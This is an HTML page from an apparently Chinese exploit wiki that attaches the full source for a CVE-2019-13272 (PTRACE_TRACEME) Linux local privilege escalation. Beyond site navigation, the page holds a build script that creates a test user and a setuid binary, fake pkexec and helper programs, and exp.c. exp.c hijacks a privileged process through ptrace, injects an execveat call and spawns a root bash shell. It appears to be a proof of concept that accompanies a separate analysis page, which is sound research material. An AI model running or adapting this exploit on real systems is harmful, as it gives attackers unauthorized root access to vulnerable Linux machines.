<!DOCTYPE html>
<!--[if IE 8]><html class="no-js lt-ie9" lang="en" > <![endif]-->
<!--[if gt IE 8]><!--> <html class="no-js" lang="en" > <!--<![endif]-->
<head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  
  
  <link rel="shortcut icon" href="../../img/favicon.ico">
  <title>Cve 2019 13272 附件 - expwiki</title>
  <link href='https://fonts.googleapis.com/css?family=Lato:400,700|Roboto+Slab:400,700|Inconsolata:400,700' rel='stylesheet' type='text/css'>

  <link rel="stylesheet" href="../../css/theme.css" type="text/css" />
  <link rel="stylesheet" href="../../css/theme_extra.css" type="text/css" />
  <link rel="stylesheet" href="../../css/highlight.css">
  
  <script>
    // Current page data
    var mkdocs_page_name = "Cve 2019 13272 \u9644\u4ef6";
    var mkdocs_page_input_path = "kernel/cve-2019-13272-\u9644\u4ef6.md";
    var mkdocs_page_url = "/kernel/cve-2019-13272-\u9644\u4ef6/";
  </script>
  
  <script src="../../js/jquery-2.1.1.min.js"></script>
  <script src="../../js/modernizr-2.8.3.min.js"></script>
  <script type="text/javascript" src="../../js/highlight.pack.js"></script> 
  
</head>

<body class="wy-body-for-nav" role="document">

  <div class="wy-grid-for-nav">

    
    <nav data-toggle="wy-nav-shift" class="wy-nav-side stickynav">
      <div class="wy-side-nav-search">
        <a href="../.." class="icon icon-home"> expwiki</a>
        <div role="search">
  <form id ="rtd-search-form" class="wy-form" action="../../search.html" method="get">
    <input type="text" name="q" placeholder="Search docs" />
  </form>
</div>
      </div>

      <div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="main navigation">
	<ul class="current">
	  
          
            <li class="toctree-l1">
		
    <a class="" href="../..">Home</a>
	    </li>
          
            <li class="toctree-l1">
		
    <a class="" href="../../acknowledgements/">Acknowledgements</a>
	    </li>
          
            <li class="toctree-l1">
		
    <span class="caption-text">Kernel</span>
    <ul class="subnav">
                <li class="">
                    
    <a class="" href="../cve-2018-18281-分析/">Cve 2018 18281 分析</a>
                </li>
                <li class="">
                    
    <a class="" href="../cve-2018-18281-附件/">Cve 2018 18281 附件</a>
                </li>
                <li class="">
                    
    <a class="" href="../cve-2019-13272-分析/">Cve 2019 13272 分析</a>
                </li>
                <li class=" current">
                    
    <a class="current" href="./">Cve 2019 13272 附件</a>
    <ul class="subnav">
            
    <li class="toctree-l3"><a href="#ptrace_traceme-cve-2019-13272">PTRACE_TRACEME 本地提权漏洞(CVE-2019-13272)分析附件</a></li>
    
        <ul>
        
            <li><a class="toctree-l4" href="#exp">exp 源码</a></li>
        
        </ul>
    

    </ul>
                </li>
    </ul>
	    </li>
          
            <li class="toctree-l1">
		
    <span class="caption-text">Userspace</span>
    <ul class="subnav">
                <li class="">
                    
    <a class="" href="../../userspace/cve-2018-1000001-分析/">Cve 2018 1000001 分析</a>
                </li>
                <li class="">
                    
    <a class="" href="../../userspace/cve-2018-1000001-附件/">Cve 2018 1000001 附件</a>
                </li>
                <li class="">
                    
    <a class="" href="../../userspace/cve-2019-12735-分析/">Cve 2019 12735 分析</a>
                </li>
                <li class="">
                    
    <a class="" href="../../userspace/cve-2019-12735-附件/">Cve 2019 12735 附件</a>
                </li>
                <li class="">
                    
    <a class="" href="../../userspace/cve-2019-5736-分析/">Cve 2019 5736 分析</a>
                </li>
                <li class="">
                    
    <a class="" href="../../userspace/cve-2019-5736-附件/">Cve 2019 5736 附件</a>
                </li>
    </ul>
	    </li>
          
        </ul>
      </div>
      &nbsp;
    </nav>

    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap">

      
      <nav class="wy-nav-top" role="navigation" aria-label="top navigation">
        <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
        <a href="../..">expwiki</a>
      </nav>

      
      <div class="wy-nav-content">
        <div class="rst-content">
          <div role="navigation" aria-label="breadcrumbs navigation">
  <ul class="wy-breadcrumbs">
    <li><a href="../..">Docs</a> &raquo;</li>
    
      
        
          <li>Kernel &raquo;</li>
        
      
    
    <li>Cve 2019 13272 附件</li>
    <li class="wy-breadcrumbs-aside">
      
    </li>
  </ul>
  <hr/>
</div>
          <div role="main">
            <div class="section">
              
                <h1 id="ptrace_traceme-cve-2019-13272">PTRACE_TRACEME 本地提权漏洞(CVE-2019-13272)分析附件</h1>
<h2 id="exp">exp 源码</h2>
<h3 id="makesh">make.sh</h3>
<pre><code class="shell">gcc -o exp exp.c
gcc -o fakepkexec fakepkexec.c
gcc -o fakehelper fakehelper.c 
mv exp  /tmp/
mv fakehelper  /tmp/
mv fakepkexec /tmp/

useradd test
chown test:test /tmp/exp  /tmp/fakehelper
chown root:root /tmp/fakepkexec
chmod u+s  /tmp/fakepkexec 
su test 
</code></pre>

<h3 id="fakepkexecc">fakepkexec.c</h3>
<pre><code class="c">#define _GNU_SOURCE
#include &lt;unistd.h&gt;
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/stat.h&gt;
#include &lt;string.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;err.h&gt;
#include &lt;pwd.h&gt;
#include &lt;errno.h&gt;


int
main (int argc, char *argv[])
{
    char* user;
    char* command;

    if(geteuid() != 0) {
        err(2, &quot;pkexec must be setuid root\n&quot;);
        goto out;
    }
    if(strcmp(argv[1], &quot;--user&quot;) != 0) {
        err(2, &quot;must setting a new user\n&quot;);
        goto out;
    }
    user = strdup(argv[2]);

    struct passwd *pw = getpwnam(user);
    if (pw == NULL) err(2, &quot;getpwuid&quot;);

    sleep(1);

    setregid (pw-&gt;pw_gid, pw-&gt;pw_gid);
    setreuid (pw-&gt;pw_uid, pw-&gt;pw_uid);
    if ((geteuid () != pw-&gt;pw_uid) || (getuid () != pw-&gt;pw_uid) ||
            (getegid () != pw-&gt;pw_gid) || (getgid () != pw-&gt;pw_gid))
    {
        err(2, &quot;Error becoming real+effective uid %d and gid %d: %s\n&quot;,pw-&gt;pw_uid, pw-&gt;pw_gid, strerror(errno));
        goto out;
    }

    execl(&quot;/tmp/fakehelper&quot;, &quot;fakehelper&quot;, &quot;--help&quot;, NULL);
out:
    err(2, &quot;execl fakehelper&quot;);
}
</code></pre>

<h3 id="fakehelperc">fakehelper.c</h3>
<pre><code class="c">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/stat.h&gt;
#include &lt;unistd.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;errno.h&gt;
#include &lt;signal.h&gt;


int
main (int argc, char *argv[])
{
    printf(&quot;run fakehelper pid=%d euid = %d\n&quot;, getpid(), geteuid());
}

</code></pre>

<h3 id="expc">exp.c</h3>
<pre><code class="c">#define _GNU_SOURCE
#include &lt;string.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
#include &lt;err.h&gt;
#include &lt;signal.h&gt;
#include &lt;stdio.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;sched.h&gt;
#include &lt;stddef.h&gt;
#include &lt;stdarg.h&gt;
#include &lt;pwd.h&gt;
#include &lt;sys/prctl.h&gt;
#include &lt;sys/wait.h&gt;
#include &lt;sys/ptrace.h&gt;
#include &lt;sys/user.h&gt;
#include &lt;sys/syscall.h&gt;
#include &lt;sys/stat.h&gt;
#include &lt;linux/elf.h&gt;

#define SAFE(expr) ({                   \
  typeof(expr) __res = (expr);          \
  if (__res == -1) err(1, &quot;%s&quot;, #expr); \
  __res;                                \
})
#define max(a,b) ((a)&gt;(b) ? (a) : (b))

static int middle_success = 1;
static int block_pipe[2];
static int self_fd = -1;
static int dummy_status;
static const char *helper_path;

/* temporary printf; returned pointer is valid until next tprintf */
static char *tprintf(char *fmt, ...) {
  static char buf[10000];
  va_list ap;
  va_start(ap, fmt);
  vsprintf(buf, fmt, ap);
  va_end(ap);
  return buf;
}

static int middle_main(void *dummy) {
  prctl(PR_SET_PDEATHSIG, SIGKILL);
  pid_t middle = getpid();

  self_fd = SAFE(open(&quot;/proc/self/exe&quot;, O_RDONLY));

  pid_t child = SAFE(fork());
  if (child == 0) {
    prctl(PR_SET_PDEATHSIG, SIGKILL);

    SAFE(dup2(self_fd, 42));

    /* spin until our parent becomes privileged (have to be fast here) */
    int proc_fd = SAFE(open(tprintf(&quot;/proc/%d/status&quot;, middle), O_RDONLY));
    char *needle = tprintf(&quot;\nUid:\t%d\t0\t&quot;, getuid());
    while (1) {
      char buf[1000];
      ssize_t buflen = SAFE(pread(proc_fd, buf, sizeof(buf)-1, 0));
      buf[buflen] = '\0';
      if (strstr(buf, needle)) break;
    }

    /*
     * this is where the bug is triggered.
     * while our parent is in the middle of pkexec, we force it to become our
     * tracer, with pkexec's creds as ptracer_cred.
     */
    SAFE(ptrace(PTRACE_TRACEME, 0, NULL, NULL));

    /*
     * now we execute passwd. because the ptrace relationship is considered to
     * be privileged, this is a proper suid execution despite the attached
     * tracer, not a degraded one.
     * at the end of execve(), this process receives a SIGTRAP from ptrace.
     */
    puts(&quot;executing passwd&quot;);
    execl(&quot;/usr/bin/passwd&quot;, &quot;passwd&quot;, NULL);
    err(1, &quot;execl passwd&quot;);
  }

  SAFE(dup2(self_fd, 0));
  SAFE(dup2(block_pipe[1], 1));

  struct passwd *pw = getpwuid(getuid());
  if (pw == NULL) err(1, &quot;getpwuid&quot;);

  middle_success = 1;
  execl(&quot;/tmp/fakepkexec&quot;, &quot;fakepkexec&quot;, &quot;--user&quot;, pw-&gt;pw_name, NULL);
  middle_success = 0;
  err(1, &quot;execl pkexec&quot;);
}

static void force_exec_and_wait(pid_t pid, int exec_fd, char *arg0) {
  struct user_regs_struct regs;
  struct iovec iov = { .iov_base = &amp;regs, .iov_len = sizeof(regs) };
  SAFE(ptrace(PTRACE_SYSCALL, pid, 0, NULL));
  SAFE(waitpid(pid, &amp;dummy_status, 0));
  SAFE(ptrace(PTRACE_GETREGSET, pid, NT_PRSTATUS, &amp;iov));

  /* set up indirect arguments */
  unsigned long scratch_area = (regs.rsp - 0x1000) &amp; ~0xfffUL;
  struct injected_page {
    unsigned long argv[2];
    unsigned long envv[1];
    char arg0[8];
    char path[1];
  } ipage = {
    .argv = { scratch_area + offsetof(struct injected_page, arg0) }
  };
  strcpy(ipage.arg0, arg0);
  for (int i = 0; i &lt; sizeof(ipage)/sizeof(long); i++) {
    unsigned long pdata = ((unsigned long *)&amp;ipage)[i];
    SAFE(ptrace(PTRACE_POKETEXT, pid, scratch_area + i * sizeof(long),
                (void*)pdata));
  }

  /* execveat(exec_fd, path, argv, envv, flags) */
  regs.orig_rax = __NR_execveat;
  regs.rdi = exec_fd;
  regs.rsi = scratch_area + offsetof(struct injected_page, path);
  regs.rdx = scratch_area + offsetof(struct injected_page, argv);
  regs.r10 = scratch_area + offsetof(struct injected_page, envv);
  regs.r8 = AT_EMPTY_PATH;

  SAFE(ptrace(PTRACE_SETREGSET, pid, NT_PRSTATUS, &amp;iov));
  SAFE(ptrace(PTRACE_DETACH, pid, 0, NULL));
  SAFE(waitpid(pid, &amp;dummy_status, 0));
}

static int middle_stage2(void) {
  /* our child is hanging in signal delivery from execve()'s SIGTRAP */
  pid_t child = SAFE(waitpid(-1, &amp;dummy_status, 0));
  force_exec_and_wait(child, 42, &quot;stage3&quot;);
  return 0;
}

static int spawn_shell(void) {
  SAFE(setresgid(0, 0, 0));
  SAFE(setresuid(0, 0, 0));
  execlp(&quot;bash&quot;, &quot;bash&quot;, NULL);
  err(1, &quot;execlp&quot;);
}

int main(int argc, char **argv) {
  if (strcmp(argv[0], &quot;stage2&quot;) == 0)
    return middle_stage2();
  if (strcmp(argv[0], &quot;stage3&quot;) == 0)
    return spawn_shell();

  helper_path = &quot;/tmp/fakehelper&quot;;

  /*
   * set up a pipe such that the next write to it will block: packet mode,
   * limited to one packet
   */
  SAFE(pipe2(block_pipe, O_CLOEXEC|O_DIRECT));
  SAFE(fcntl(block_pipe[0], F_SETPIPE_SZ, 0x1000));
  char dummy = 0;
  SAFE(write(block_pipe[1], &amp;dummy, 1));

  /* spawn pkexec in a child, and continue here once our child is in execve() */
  static char middle_stack[1024*1024];
  pid_t midpid = SAFE(clone(middle_main, middle_stack+sizeof(middle_stack),
                            CLONE_VM|CLONE_VFORK|SIGCHLD, NULL));
  if (!middle_success) return 1;

  /*
   * wait for our child to go through both execve() calls (first pkexec, then
   * the executable permitted by polkit policy).
   */
  while (1) {
    int fd = open(tprintf(&quot;/proc/%d/comm&quot;, midpid), O_RDONLY);
    char buf[16];
    int buflen = SAFE(read(fd, buf, sizeof(buf)-1));
    buf[buflen] = '\0';
    *strchrnul(buf, '\n') = '\0';
    if (strncmp(buf, basename(helper_path), 15) == 0)
      break;
    usleep(100000);
  }

  /*
   * our child should have gone through both the privileged execve() and the
   * following execve() here
   */
  SAFE(ptrace(PTRACE_ATTACH, midpid, 0, NULL));
  SAFE(waitpid(midpid, &amp;dummy_status, 0));
  fputs(&quot;attached to midpid\n&quot;, stderr);

  force_exec_and_wait(midpid, 0, &quot;stage2&quot;);
  return 0;
}
</code></pre>
              
            </div>
          </div>
          <footer>
  
    <div class="rst-footer-buttons" role="navigation" aria-label="footer navigation">
      
        <a href="../../userspace/cve-2018-1000001-分析/" class="btn btn-neutral float-right" title="Cve 2018 1000001 分析">Next <span class="icon icon-circle-arrow-right"></span></a>
      
      
        <a href="../cve-2019-13272-分析/" class="btn btn-neutral" title="Cve 2019 13272 分析"><span class="icon icon-circle-arrow-left"></span> Previous</a>
      
    </div>
  

  <hr/>

  <div role="contentinfo">
    <!-- Copyright etc -->
    
  </div>

  Built with <a href="http://www.mkdocs.org">MkDocs</a> using a <a href="https://github.com/snide/sphinx_rtd_theme">theme</a> provided by <a href="https://readthedocs.org">Read the Docs</a>.
</footer>
	  
        </div>
      </div>

    </section>
    
  </div>

  <div class="rst-versions" role="note" style="cursor: pointer">
    <span class="rst-current-version" data-toggle="rst-current-version">
      
      
        <span><a href="../cve-2019-13272-分析/" style="color: #fcfcfc;">&laquo; Previous</a></span>
      
      
        <span style="margin-left: 15px"><a href="../../userspace/cve-2018-1000001-分析/" style="color: #fcfcfc">Next &raquo;</a></span>
      
    </span>
</div>
    <script src="../../js/theme.js"></script>

</body>
</html>
